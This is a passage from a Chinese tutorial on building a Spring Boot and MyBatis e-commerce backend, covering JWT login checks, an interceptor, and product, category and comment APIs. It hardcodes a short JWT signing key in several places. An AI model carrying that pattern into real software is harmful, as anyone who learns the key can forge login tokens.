7.4.2 生成JWT 添加依赖 &lt;dependency&gt; &lt;groupId&gt;com.auth0&lt;/groupId&gt; &lt;artifactId&gt;java-jwt&lt;/artifactId&gt; &lt;version&gt;3.10.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt; &lt;artifactId&gt;jjwt&lt;/artifactId&gt; &lt;version&gt;0.9.1&lt;/version&gt; &lt;/dependency&gt; 生成token String token = builder.setSubject(name) //主题，就是token中携带的数据 .setIssuedAt(new Date()) //设置token的生成时间 .setId(users.get(0).getUserId() + \"\") //设置用户id为token id .setClaims(map) //map中可以存放用户的角色权限信息 .setExpiration(new Date(System.currentTimeMillis() + 24 * 60 * 60 * 1000)) //设置过期时间 .signWith(SignatureAlgorithm.HS256, \"QIANfeng6666\") //设置加密方式和加密密码 .compact(); 7.4.3 JWT校验 如果token正确则正常解析，如果token不正确或者过期，则通过抛出的异常进行识别 try { //验证token JwtParser parser = Jwts.parser(); parser.setSigningKey(\"QIANfeng6666\"); //解析token的SigningKey必须和生成token时设置密码一致 //如果token正确（密码正确，有效期内）则正常执行，否则抛出异常 Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token); Claims body = claimsJws.getBody(); //获取token中用户数据 String subject = body.getSubject(); //获取生成token设置的subject String v1 = body.get(\"key1\", String.class); //获取生成token时存储的Claims的map中的值 return new ResultVO(ResStatus.OK,\"success\",null); }catch (ExpiredJwtException e){ return new ResultVO(ResStatus.NO,\"登录过期，请重新登录！\",null); }catch (UnsupportedJwtException e){ return new ResultVO(ResStatus.NO,\"Tonken不合法，请自重！\",null); }catch (Exception e){ return new ResultVO(ResStatus.NO,\"请重新登录！\",null); } 7.4.4 拦截器校验Token 创建拦截器 @Component public class CheckTokenInterceptor implements HandlerInterceptor { @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { String token = request.getParameter(\"token\"); if(token == null){ ResultVO resultVO = new ResultVO(ResStatus.NO, \"请先登录！\", null); //提示请先登录 doResponse(response,resultVO); }else{ try { //验证token JwtParser parser = Jwts.parser(); //解析token的SigningKey必须和生成token时设置密码一致 parser.setSigningKey(\"QIANfeng6666\"); //如果token正确（密码正确，有效期内）则正常执行，否则抛出异常 Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token); return true; }catch (ExpiredJwtException e){ ResultVO resultVO = new ResultVO(ResStatus.NO, \"登录过期，请重新登录！\", null); doResponse(response,resultVO); }catch (UnsupportedJwtException e){ ResultVO resultVO = new ResultVO(ResStatus.NO, \"Token不合法，请自重！\", null); doResponse(response,resultVO); }catch (Exception e){ ResultVO resultVO = new ResultVO(ResStatus.NO, \"请先登录！\", null); doResponse(response,resultVO); } } return false; } private void doResponse(HttpServletResponse response,ResultVO resultVO) throws IOException { response.setContentType(\"application/json\"); response.setCharacterEncoding(\"utf-8\"); PrintWriter out = response.getWriter(); String s = new ObjectMapper().writeValueAsString(resultVO); out.print(s); out.flush(); out.close(); } } 配置拦截器 @Configuration public class InterceptorConfig implements WebMvcConfigurer { @Autowired private CheckTokenInterceptor checkTokenInterceptor; @Override public void addInterceptors(InterceptorRegistry registry) { registry.addInterceptor(checkTokenInterceptor) .addPathPatterns(\"/**\") .excludePathPatterns(\"/user/**\"); } } 7.5 请求头传递token 前端但凡访问受限资源，都必须携带token发送请求；token可以通过请求行(params)、请求头（header）以及请求体（data）传递，但是习惯性使用header传递 7.5.1 axios通过请求头传值axios({ method:\"get\", url:baseUrl+\"shopcart/list\", headers:{ token:this.token } }).then(function(res){ console.log(res); }); 7.5.2 在拦截器中放行options请求@Component public class CheckTokenInterceptor implements HandlerInterceptor { @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { //放行options请求 String method = request.getMethod(); if(\"OPTIONS\".equalsIgnoreCase(method)){ return true; } String token = request.getHeader(\"token\"); System.out.println(\"-------------\"+token); if(token == null){ ResultVO resultVO = new ResultVO(ResStatus.NO, \"请先登录！\", null); //提示请先登录 doResponse(response,resultVO); }else{ try { //验证token JwtParser parser = Jwts.parser(); //解析token的SigningKey必须和生成token时设置密码一致 parser.setSigningKey(\"QIANfeng6666\"); //如果token正确（密码正确，有效期内）则正常执行，否则抛出异常 Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token); return true; }catch (ExpiredJwtException e){ ResultVO resultVO = new ResultVO(ResStatus.NO, \"登录过期，请重新登录！\", null); doResponse(response,resultVO); }catch (UnsupportedJwtException e){ ResultVO resultVO = new ResultVO(ResStatus.NO, \"Token不合法，请自重！\", null); doResponse(response,resultVO); }catch (Exception e){ ResultVO resultVO = new ResultVO(ResStatus.NO, \"请先登录！\", null); doResponse(response,resultVO); } } return false; } private void doResponse(HttpServletResponse response,ResultVO resultVO) throws IOException { response.setContentType(\"application/json\"); response.setCharacterEncoding(\"utf-8\"); PrintWriter out = response.getWriter(); String s = new ObjectMapper().writeValueAsString(resultVO); out.print(s); out.flush(); out.close(); } } 八、首页—轮播图8.1 实现流程分析 流程图 接口 查询轮播图信息返回 8.2 完成后台接口开发8.2.1 数据库操作实现 分析数据表结构 添加测试数据 编写sql语句 select img_id, img_url, img_bg_color, prod_id, category_id, index_type, seq, status, create_time, update_time from index_img where status=1 order by seq 在Mapper接口（DAO）中定义操作方法 public interface IndexImgMapper extends GeneralDAO&lt;IndexImg&gt; { //1.查询轮播图信息： 查询status=1 且 按照seq进行排序 public List&lt;IndexImg&gt; listIndexImgs(); } 配置映射文件 &lt;!--BaseResultMap是由逆向工程生成的--&gt; &lt;select id=\"listIndexImgs\" resultMap=\"BaseResultMap\"&gt; select img_id, img_url, img_bg_color, prod_id, category_id, index_type, seq, status, create_time, update_time from index_img where status=1 order by seq &lt;/select&gt; 8.2.2 业务层实现 IndexImgService接口 public interface IndexImgService { public ResultVO listIndexImgs(); } IndexImgServiceImpl实现类 @Service public class IndexImgServiceImpl implements IndexImgService { @Autowired private IndexImgMapper indexImgMapper; public ResultVO listIndexImgs() { List&lt;IndexImg&gt; indexImgs = indexImgMapper.listIndexImgs(); if(indexImgs.size()==0){ return new ResultVO(ResStatus.NO,\"fail\",null); }else{ return new ResultVO(ResStatus.OK,\"success\",indexImgs); } } } 8.2.3 控制层实现 IndexController类 @RestController @CrossOrigin @RequestMapping(\"/index\") @Api(value = \"提供首页数据显示所需的接口\",tags = \"首页管理\") public class IndexController { @Autowired private IndexImgService indexImgService; @GetMapping(\"/indeximg\") @ApiOperation(\"首页轮播图接口\") public ResultVO listIndexImgs(){ return indexImgService.listIndexImgs(); } } 8.3 完成前端功能 当进入到index.html，在进行页面初始化之后，就需要请求轮播图数据进行轮播图的显示 index.html 九、首页-分类列表9.1 实现流程分析 方案一：一次性查询三级分类 优点：只需要一次查询，根据一级分类显示二级分类时响应速度较快 缺点：数据库查询效率较低，页面首次加载的速度也相对较慢 方案二：先只查询一级分类，用户点击/鼠标移动到一级分类，动态加载二级分类 优点：数据库查询效率提高，页面首次加载速度提高 缺点：需要多次连接数据库 9.2 接口开发9.2.1 数据库操作实现 数据表结构 添加测试数据 编写接口实现所需的SQL 连接查询 select c1.category_id 'category_id1', c1.category_name 'category_name1', c1.category_level 'category_level1', c1.parent_id 'parent_id1', c1.category_icon 'category_icon1', c1.category_slogan 'category_slogan1', c1.category_pic 'category_pic1', c1.category_bg_color 'category_bg_color1', c2.category_id 'category_id2', c2.category_name 'category_name2', c2.category_level 'category_level2', c2.parent_id 'parent_id2', c3.category_id 'category_id3', c3.category_name 'category_name3', c3.category_level 'category_level3', c3.parent_id 'parent_id3' from category c1 inner join category c2 on c2.parent_id=c1.category_id left join category c3 on c3.parent_id=c2.category_id where c1.category_level=1 子查询 -- 根据父级分类的id查询类别信息 select * from category where parent_id=3; 创建用于封装查询的类别信息的CategoryVO 在beans子工程的entity包新建一个CategoryVO用于封装查询到类别信息，相对于Category来说，新增了如下属性： public class CategoryVO { //用于存放当前分类的子分类 private List&lt;CategoryVO&gt; categories; public List&lt;CategoryVO&gt; getCategories() { return categories; } } 在CategoryMapper定义操作方法 @Repository public interface CategoryMapper extends GeneralDAO&lt;Category&gt; { //1.连接查询 public List&lt;CategoryVO&gt; selectAllCategories(); //2.子查询：根据parentId查询子分类 public List&lt;CategoryVO&gt; selectAllCategories2(int parentId); } 映射配置 &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE mapper PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\" \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\"&gt; &lt;mapper namespace=\"com.qfedu.fmmall.dao.CategoryMapper\"&gt; &lt;resultMap id=\"BaseResultMap\" type=\"com.qfedu.fmmall.entity.Category\"&gt; &lt;id column=\"category_id\" jdbcType=\"INTEGER\" property=\"categoryId\" /&gt; &lt;result column=\"category_name\" jdbcType=\"VARCHAR\" property=\"categoryName\" /&gt; &lt;result column=\"category_level\" jdbcType=\"INTEGER\" property=\"categoryLevel\" /&gt; &lt;result column=\"parent_id\" jdbcType=\"INTEGER\" property=\"parentId\" /&gt; &lt;result column=\"category_icon\" jdbcType=\"VARCHAR\" property=\"categoryIcon\" /&gt; &lt;result column=\"category_slogan\" jdbcType=\"VARCHAR\" property=\"categorySlogan\" /&gt; &lt;result column=\"category_pic\" jdbcType=\"VARCHAR\" property=\"categoryPic\" /&gt; &lt;result column=\"category_bg_color\" jdbcType=\"VARCHAR\" property=\"categoryBgColor\" /&gt; &lt;/resultMap&gt; &lt;resultMap id=\"categoryVOMap\" type=\"com.qfedu.fmmall.entity.CategoryVO\"&gt; &lt;id column=\"category_id1\" jdbcType=\"INTEGER\" property=\"categoryId\" /&gt; &lt;result column=\"category_name1\" jdbcType=\"VARCHAR\" property=\"categoryName\" /&gt; &lt;result column=\"category_level1\" jdbcType=\"INTEGER\" property=\"categoryLevel\" /&gt; &lt;result column=\"parent_id1\" jdbcType=\"INTEGER\" property=\"parentId\" /&gt; &lt;result column=\"category_icon1\" jdbcType=\"VARCHAR\" property=\"categoryIcon\" /&gt; &lt;result column=\"category_slogan1\" jdbcType=\"VARCHAR\" property=\"categorySlogan\" /&gt; &lt;result column=\"category_pic1\" jdbcType=\"VARCHAR\" property=\"categoryPic\" /&gt; &lt;result column=\"category_bg_color1\" jdbcType=\"VARCHAR\" property=\"categoryBgColor\" /&gt; &lt;collection property=\"categories\" ofType=\"com.qfedu.fmmall.entity.CategoryVO\"&gt; &lt;id column=\"category_id2\" jdbcType=\"INTEGER\" property=\"categoryId\" /&gt; &lt;result column=\"category_name2\" jdbcType=\"VARCHAR\" property=\"categoryName\" /&gt; &lt;result column=\"category_level2\" jdbcType=\"INTEGER\" property=\"categoryLevel\" /&gt; &lt;result column=\"parent_id2\" jdbcType=\"INTEGER\" property=\"parentId\" /&gt; &lt;collection property=\"categories\" ofType=\"com.qfedu.fmmall.entity.CategoryVO\"&gt; &lt;id column=\"category_id3\" jdbcType=\"INTEGER\" property=\"categoryId\" /&gt; &lt;result column=\"category_name3\" jdbcType=\"VARCHAR\" property=\"categoryName\" /&gt; &lt;result column=\"category_level3\" jdbcType=\"INTEGER\" property=\"categoryLevel\" /&gt; &lt;result column=\"parent_id3\" jdbcType=\"INTEGER\" property=\"parentId\" /&gt; &lt;/collection&gt; &lt;/collection&gt; &lt;/resultMap&gt; &lt;select id=\"selectAllCategories\" resultMap=\"categoryVOMap\"&gt; select c1.category_id 'category_id1', c1.category_name 'category_name1', c1.category_level 'category_level1', c1.parent_id 'parent_id1', c1.category_icon 'category_icon1', c1.category_slogan 'category_slogan1', c1.category_pic 'category_pic1', c1.category_bg_color 'category_bg_color1', c2.category_id 'category_id2', c2.category_name 'category_name2', c2.category_level 'category_level2', c2.parent_id 'parent_id2', c3.category_id 'category_id3', c3.category_name 'category_name3', c3.category_level 'category_level3', c3.parent_id 'parent_id3' from category c1 inner join category c2 on c2.parent_id=c1.category_id left join category c3 on c3.parent_id=c2.category_id where c1.category_level=1 &lt;/select&gt; &lt;!----------------------------------------------------------------------------&gt; &lt;resultMap id=\"categoryVOMap2\" type=\"com.qfedu.fmmall.entity.CategoryVO\"&gt; &lt;id column=\"category_id\" jdbcType=\"INTEGER\" property=\"categoryId\" /&gt; &lt;result column=\"category_name\" jdbcType=\"VARCHAR\" property=\"categoryName\" /&gt; &lt;result column=\"category_level\" jdbcType=\"INTEGER\" property=\"categoryLevel\" /&gt; &lt;result column=\"parent_id\" jdbcType=\"INTEGER\" property=\"parentId\" /&gt; &lt;result column=\"category_icon\" jdbcType=\"VARCHAR\" property=\"categoryIcon\" /&gt; &lt;result column=\"category_slogan\" jdbcType=\"VARCHAR\" property=\"categorySlogan\" /&gt; &lt;result column=\"category_pic\" jdbcType=\"VARCHAR\" property=\"categoryPic\" /&gt; &lt;result column=\"category_bg_color\" jdbcType=\"VARCHAR\" property=\"categoryBgColor\" /&gt; &lt;collection property=\"categories\" column=\"category_id\" select=\"com.qfedu.fmmall.dao.CategoryMapper.selectAllCategories2\"/&gt; &lt;/resultMap&gt; &lt;!-- 根据父级分类的id查询子级分类 --&gt; &lt;select id=\"selectAllCategories2\" resultMap=\"categoryVOMap2\"&gt; select category_id, category_name, category_level, parent_id, category_icon, category_slogan, category_pic, category_bg_color from category where parent_id=#{parentId} &lt;/select&gt; &lt;/mapper&gt; 9.2.2 业务层实现 CategoryService接口 public interface CategoryService { public ResultVO listCategories(); } CategoryServiceImpl @Service public class CategoryServiceImpl implements CategoryService { @Autowired private CategoryMapper categoryMapper; public ResultVO listCategories() { List&lt;CategoryVO&gt; categoryVOS = categoryMapper.selectAllCategories(); ResultVO resultVO = new ResultVO(ResStatus.OK, \"success\", categoryVOS); return resultVO; } } 9.2.3 控制层实现 IndexController @Autowired private CategoryService categoryService; @GetMapping(\"/category-list\") @ApiOperation(\"商品分类查询接口\") public ResultVO listCatetory(){ return categoryService.listCategories(); } 9.3 前端功能实现十、首页-商品推荐10.1 流程分析 10.2 接口开发10.2.1 数据库实现 商品推荐算法：推荐最新上架的商品 说明：商品推荐算法是根据多个维度进行权重计算，计算出一个匹配值 数据表分析及数据准备 sql -- 商品推荐：查询最新上架的商品 select * from product order by create_time desc limit 0,3; -- 子查询：根据商品id查询商品图片 select * from product_img where item_id=2; 在beans子工程entity包创建ProductVO,相比较Product新增了List imgs用于存储商品的图片 public class ProductVO{ private List&lt;ProductImg&gt; imgs; public List&lt;ProductImg&gt; getImgs() { return imgs; } public void setImgs(List&lt;ProductImg&gt; imgs) { this.imgs = imgs; } } Mapper接口定义操作方法： ProductMapper public interface ProductMapper extends GeneralDAO&lt;Product&gt; { public List&lt;ProductVO&gt; selectRecommendProducts(); } ProductImgMapper public interface ProductImgMapper extends GeneralDAO&lt;ProductImg&gt; { //根据商品id查询当前商品的图片信息 public List&lt;ProductImg&gt; selectProductImgByProductId(int productId); } 配置映射文件 ProductMapper.xml &lt;resultMap id=\"ProductVOMap\" type=\"com.qfedu.fmmall.entity.ProductVO\"&gt; &lt;id column=\"product_id\" jdbcType=\"VARCHAR\" property=\"productId\" /&gt; &lt;result column=\"product_name\" jdbcType=\"VARCHAR\" property=\"productName\" /&gt; &lt;result column=\"category_id\" jdbcType=\"INTEGER\" property=\"categoryId\" /&gt; &lt;result column=\"root_category_id\" jdbcType=\"INTEGER\" property=\"rootCategoryId\" /&gt; &lt;result column=\"sold_num\" jdbcType=\"INTEGER\" property=\"soldNum\" /&gt; &lt;result column=\"product_status\" jdbcType=\"INTEGER\" property=\"productStatus\" /&gt; &lt;result column=\"create_time\" jdbcType=\"TIMESTAMP\" property=\"createTime\" /&gt; &lt;result column=\"update_time\" jdbcType=\"TIMESTAMP\" property=\"updateTime\" /&gt; &lt;result column=\"content\" jdbcType=\"LONGVARCHAR\" property=\"content\" /&gt; &lt;collection property=\"imgs\" select=\"com.qfedu.fmmall.dao.ProductImgMapper.selectProductImgByProductId\" column=\"product_id\"/&gt; &lt;/resultMap&gt; &lt;select id=\"selectRecommendProducts\" resultMap=\"ProductVOMap\"&gt; select product_id, product_name, category_id, root_category_id, sold_num, product_status, content, create_time, update_time from product order by create_time desc limit 0,3 &lt;/select&gt; ProductImgMapper.xml &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE mapper PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\" \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\"&gt; &lt;mapper namespace=\"com.qfedu.fmmall.dao.ProductImgMapper\"&gt; &lt;resultMap id=\"BaseResultMap\" type=\"com.qfedu.fmmall.entity.ProductImg\"&gt; &lt;id column=\"id\" jdbcType=\"VARCHAR\" property=\"id\" /&gt; &lt;result column=\"item_id\" jdbcType=\"VARCHAR\" property=\"itemId\" /&gt; &lt;result column=\"url\" jdbcType=\"VARCHAR\" property=\"url\" /&gt; &lt;result column=\"sort\" jdbcType=\"INTEGER\" property=\"sort\" /&gt; &lt;result column=\"is_main\" jdbcType=\"INTEGER\" property=\"isMain\" /&gt; &lt;result column=\"created_time\" jdbcType=\"TIMESTAMP\" property=\"createdTime\" /&gt; &lt;result column=\"updated_time\" jdbcType=\"TIMESTAMP\" property=\"updatedTime\" /&gt; &lt;/resultMap&gt; &lt;select id=\"selectProductImgByProductId\" resultMap=\"BaseResultMap\"&gt; select id, item_id, url, sort, is_main, created_time, updated_time from product_img where item_id=#{productId} &lt;/select&gt; &lt;/mapper&gt; 10.2.2 业务层实现 ProductService接口 public interface ProductService { public ResultVO listRecommendProducts(); } ProductServiceImpl实现类 @Service public class ProductServiceImpl implements ProductService { @Autowired private ProductMapper productMapper; public ResultVO listRecommendProducts() { List&lt;ProductVO&gt; productVOS = productMapper.selectRecommendProducts(); ResultVO resultVO = new ResultVO(ResStatus.OK, \"success\", productVOS); return resultVO; } } 10.2.3 控制层实现 IndexController @Autowired private ProductService productService; @GetMapping(\"/list-recommends\") @ApiOperation(\"查询推荐商品接口\") public ResultVO listRecommendProducts() { return productService.listRecommendProducts(); } 10.3 前端实现十一、首页-分类商品推荐 按照商品的分类（一级分类）推荐销量最高的6个商品 11.1 流程分析 加载分类商品推荐有两种实现方案： 方案一：当加载首页面时不加载分类的推荐商品，监听进度条滚动事件，当进度条触底（滚动指定的距离）就触发分类推荐商品的加载，每次只加载一个分类的商品。 方案二：一次性加载所有分类的推荐商品，整体进行初始化。 11.2 接口实现11.2.1 数据库实现 数据准备 -- 添加商品 -- 添加十个分类下的商品： insert into product(product_id,product_name,category_id,root_category_id,sold_num,product_status,content,create_time,updated_time) values('5','商品5',10,1,122,1,'商品说明','2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product(product_id,product_name,category_id,root_category_id,sold_num,product_status,content,create_time,updated_time) values('6','商品6',10,1,123,1,'商品说明','2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product(product_id,product_name,category_id,root_category_id,sold_num,product_status,content,create_time,updated_time) values('7','商品7',10,1,124,1,'商品说明','2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product(product_id,product_name,category_id,root_category_id,sold_num,product_status,content,create_time,updated_time) values('8','商品8',10,1,125,1,'商品说明','2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product(product_id,product_name,category_id,root_category_id,sold_num,product_status,content,create_time,updated_time) values('9','商品9',10,1,126,1,'商品说明','2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product(product_id,product_name,category_id,root_category_id,sold_num,product_status,content,create_time,updated_time) values('10','商品10',10,1,127,1,'商品说明','2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product(product_id,product_name,category_id,root_category_id,sold_num,product_status,content,create_time,updated_time) values('11','商品11',10,1,128,1,'商品说明','2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product(product_id,product_name,category_id,root_category_id,sold_num,product_status,content,create_time,updated_time) values('12','商品12',46,2,122,1,'商品说明','2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product(product_id,product_name,category_id,root_category_id,sold_num,product_status,content,create_time,updated_time) values('13','商品13',46,2,123,1,'商品说明','2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product(product_id,product_name,category_id,root_category_id,sold_num,product_status,content,create_time,updated_time) values('14','商品14',46,2,124,1,'商品说明','2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product(product_id,product_name,category_id,root_category_id,sold_num,product_status,content,create_time,updated_time) values('15','商品15',46,2,125,1,'商品说明','2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product(product_id,product_name,category_id,root_category_id,sold_num,product_status,content,create_time,updated_time) values('16','商品16',46,2,126,1,'商品说明','2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product(product_id,product_name,category_id,root_category_id,sold_num,product_status,content,create_time,updated_time) values('17','商品17',46,2,127,1,'商品说明','2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product(product_id,product_name,category_id,root_category_id,sold_num,product_status,content,create_time,updated_time) values('18','商品18',46,2,128,1,'商品说明','2021-04-26 11:11:11','2021-04-26 11:11:11'); -- 添加商品图片 insert into product_img(id,item_id,url,sort,is_main,created_time,updated_time) values('9','5','wwxb_1.png',1,1,'2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product_img(id,item_id,url,sort,is_main,created_time,updated_time) values('10','6','wwxb_1.png',1,1,'2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product_img(id,item_id,url,sort,is_main,created_time,updated_time) values('11','7','wwxb_1.png',1,1,'2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product_img(id,item_id,url,sort,is_main,created_time,updated_time) values('12','8','wwxb_1.png',1,1,'2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product_img(id,item_id,url,sort,is_main,created_time,updated_time) values('13','9','wwxb_1.png',1,1,'2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product_img(id,item_id,url,sort,is_main,created_time,updated_time) values('14','10','wwxb_1.png',1,1,'2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product_img(id,item_id,url,sort,is_main,created_time,updated_time) values('15','11','wwxb_1.png',1,1,'2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product_img(id,item_id,url,sort,is_main,created_time,updated_time) values('16','12','wwxb_1.png',1,1,'2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product_img(id,item_id,url,sort,is_main,created_time,updated_time) values('17','13','wwxb_1.png',1,1,'2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product_img(id,item_id,url,sort,is_main,created_time,updated_time) values('18','14','wwxb_1.png',1,1,'2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product_img(id,item_id,url,sort,is_main,created_time,updated_time) values('19','15','wwxb_1.png',1,1,'2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product_img(id,item_id,url,sort,is_main,created_time,updated_time) values('20','16','wwxb_1.png',1,1,'2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product_img(id,item_id,url,sort,is_main,created_time,updated_time) values('21','17','wwxb_1.png',1,1,'2021-04-26 11:11:11','2021-04-26 11:11:11'); insert into product_img(id,item_id,url,sort,is_main,created_time,updated_time) values('22','18','wwxb_1.png',1,1,'2021-04-26 11:11:11','2021-04-26 11:11:11'); 查询SQL -- 查询所有的一级分类 select * from category where category_level=1; -- 查询每个分类下销量前6的商品 select * from product where root_category_id=2 order by sold_num desc limit 0,6; -- 查询每个商品的图片 select * from product_img where item_id = 1; 实体类： @Data @NoArgsConstructor @AllArgsConstructor @ToString public class CategoryVO { private Integer categoryId; private String categoryName; private Integer categoryLevel; private Integer parentId; private String categoryIcon; private String categorySlogan; private String categoryPic; private String categoryBgColor; //实现首页的类别显示 private List&lt;CategoryVO&gt; categories; //实现首页分类商品推荐 private List&lt;ProductVO&gt; products; } 在Mapper接口中定义查询方法 CategoryMapper ProductMapper 映射配置 ProductMapper.xml CategoryMapper.xml 11.2.2 业务层实现11.2.3 控制层实现11.3 前端实现十二、商品详情展示—显示商品基本信息 点击首页推荐的商品、轮播图商品广告、商品列表页面点击商品，就会进入到商品的详情页面 12.1 流程分析 12.2 商品基础信息-接口实现 商品基本信息、商品套餐、商品图片 SQL -- 根据id查询商品基本信息 select * from product where product_id=3; -- 根据商品id查询当前商品的图片（√） select * from product_img where item_id=3; -- 根据商品id查询当前商品的套餐 select * from product_sku where product_id=3; 因为上述的三个查询都是单表查询，可以通过tkmapper完成，无需在Mapper接口定义新的方法 业务层实现 ProductService接口 ProductServiceImpl类实现 控制层实现 ProductController类 12.3 商品基础信息-前端显示十三、商品详情展示—显示商品参数信息13.1 接口实现 根据商品id查询商品参数信息 数据库操作直接只用tkMapper的默认方法实现 业务层实现 控制层实现 13.2 前端显示商品参数13.3 前端显示商品细节前端页面间URL传值 utils.js function getUrlParam(key){ var url = decodeURI( window.location.toString() ); var arr = url.split(\"?\"); if(arr.length&gt;1){ var params = arr[1].split(\"&amp;\"); for(var i=0; i&lt;params.length; i++){ var param = params[i]; //\"pid=101\" if(param.split(\"=\")[0] == key ){ return param.split(\"=\")[1]; } } } return null; } a.html &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a href=\"b.html?pid=101&amp;pname=咪咪虾条\"&gt;跳转到B页面&lt;/a&gt; &lt;/body&gt; &lt;/html&gt; b.html &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; This is Page B... &lt;hr/&gt; &lt;script type=\"text/javascript\" src=\"js/utils.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\"&gt; var pid = getUrlParam(\"pid\"); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 十四、商品详情展示—显示商品评论信息14.1 接口实现14.1.1 数据库实现 数据表分析及数据准备 SQL -- 根据ID查询商品的评价信息，关联查询评价用户的信息 select u.username,u.nickname,u.user_img,c.* from product_comments c INNER JOIN users u ON u.user_id = c.user_id WHERE c.product_id =3; 实体类封装ProductCommentsVO @Data @AllArgsConstructor @NoArgsConstructor public class ProductCommentsVO { private String commId; private String productId; private String productName; private String orderItemId; private Integer isAnonymous; private Integer commType; private Integer commLevel; private String commContent; private String commImgs; private Date sepcName; private Integer replyStatus; private String replyContent; private Date replyTime; private Integer isShow; //封装评论对应的用户数据 private String userId; private String username; private String nickname; private String userImg; } 在Mapper接口定义查询方法 @Repository public interface ProductCommentsMapper extends GeneralDAO&lt;ProductComments&gt; { public List&lt;ProductCommentsVO&gt; selectCommontsByProductId(String productId); } 映射配置： 14.1.2 业务层实现 创建ProductCommontsService接口定义方法 public interface ProductCommontsService { public ResultVO listCommontsByProductId(String productId); } 创建实现类ProductCommontsServiceImpl实现查询操作 @Service public class ProductCommontsServiceImpl implements ProductCommontsService { @Autowired private ProductCommentsMapper productCommentsMapper; @Override public ResultVO listCommontsByProductId(String productId) { List&lt;ProductCommentsVO&gt; productCommentsVOS = productCommentsMapper.selectCommontsByProductId(productId); ResultVO resultVO = new ResultVO(ResStatus.OK, \"success\", productCommentsVOS); return resultVO; } } 14.1.3 控制层实现 ProductController @ApiOperation(\"商品评论信息查询接口\") @GetMapping(\"/detail-commonts/{pid}\") public ResultVO getProductCommonts(@PathVariable(\"pid\") String pid){ return productCommontsService.listCommontsByProductId(pid); } 14.2 前端评论内容显示十五、商品详情展示—商品评论分页及统计信息15.1 流程分析 15.2 接口开发15.2.1 改造商品评论列表接口 分页查询 定义PageHelper @Data @NoArgsConstructor @AllArgsConstructor public class PageHelper&lt;T&gt; { //总记录数 private int count; //总页数 private int pageCount; //分页数据 private List&lt;T&gt; list; } 改造数据库操作 ProductCommentsMapper 接口 ProductCommentsMapper.xml映射配置 改造业务逻辑层 ProductCommontsService接口 ProductCommontsServiceImpl 改造控制层 ProductController 15.2.2 评价统计接口实现 数据库实现 统计当前商品的总记录数 统计当前商品的好评/中评/差评 业务层实现: ProductCommontsServiceImpl @Override public ResultVO getCommentsCountByProductId(String productId) { //1.查询当前商品评价的总数 Example example = new Example(ProductComments.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(\"productId\",productId); int total = productCommentsMapper.selectCountByExample(example); //2.查询好评评价数 criteria.andEqualTo(\"commType\",1); int goodTotal = productCommentsMapper.selectCountByExample(example); //3.查询好评评价数 Example example1 = new Example(ProductComments.class); Example.Criteria criteria1 = example1.createCriteria(); criteria1.andEqualTo(\"productId\",productId); criteria1.andEqualTo(\"commType\",0); int midTotal = productCommentsMapper.selectCountByExample(example1); //4.查询好评评价数 Example example2 = new Example(ProductComments.class); Example.Criteria criteria2 = example2.createCriteria(); criteria2.andEqualTo(\"productId\",productId); criteria2.andEqualTo(\"commType\",-1); int badTotal = productCommentsMapper.selectCountByExample(example2); //5.计算好评率 double percent = (Double.parseDouble(goodTotal+\"\") / Double.parseDouble(total+\"\") )*100; String percentValue = (percent+\"\").substring(0,(percent+\"\").lastIndexOf(\".\")+3); HashMap&lt;String,Object&gt; map = new HashMap&lt;&gt;(); map.put(\"total\",total); map.put(\"goodTotal\",goodTotal); map.put(\"midTotal\",midTotal); map.put(\"badTotal\",badTotal); map.put(\"percent\",percentValue); ResultVO success = new ResultVO(ResStatus.OK, \"success\", map); return success; } 15.3 前端实现15.3.1 商品评论的分页 引用elementUI分页组件 &lt;!-- 引入样式 --&gt; &lt;link rel=\"stylesheet\" href=\"https://unpkg.com/element-ui/lib/theme-chalk/index.css\"&gt; &lt;!-- vue的引入必须在elementUI组件库引入之前 --&gt; &lt;script type=\"text/javascript\" 